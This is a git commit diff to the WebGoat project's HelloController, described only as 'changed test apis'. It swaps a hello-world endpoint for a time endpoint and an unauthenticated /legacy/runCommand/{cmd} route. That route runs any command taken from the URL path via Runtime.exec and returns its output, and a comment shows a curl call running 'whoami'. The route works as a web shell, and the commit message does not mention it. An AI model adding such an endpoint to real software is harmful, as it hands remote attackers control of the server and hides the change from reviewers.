31d951593c894cea59d96cb529d9cf00e417cb50
Eli Finkel <eyfinkel@gmail.com>
2021-10-03 13:52:51 +0300

    changed test apis

--- webgoat-container/src/main/java/org/owasp/webgoat/HelloController.java
+++ webgoat-container/src/main/java/org/owasp/webgoat/HelloController.java
@@ -1,15 +1,25 @@
 package org.owasp.webgoat;
 
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
+import java.io.IOException;
+import java.util.Date;
+
 @RestController
-@RequestMapping("/hello")
+@RequestMapping("/legacy")
 public class HelloController {
 
-    @GetMapping("/world")
-    public String showForm() {
-        return "hello world";
+    @GetMapping("/getTime") // require auth
+    public String getTime() {
+        return new Date().toString();
+    }
+
+    // curl localhost:8080/WebGoat/legacy/runCommand/whoami
+    @GetMapping("/runCommand/{cmd}")
+    public String runCommand(@PathVariable String cmd) throws IOException {
+        return new String(Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes());
     }
 }
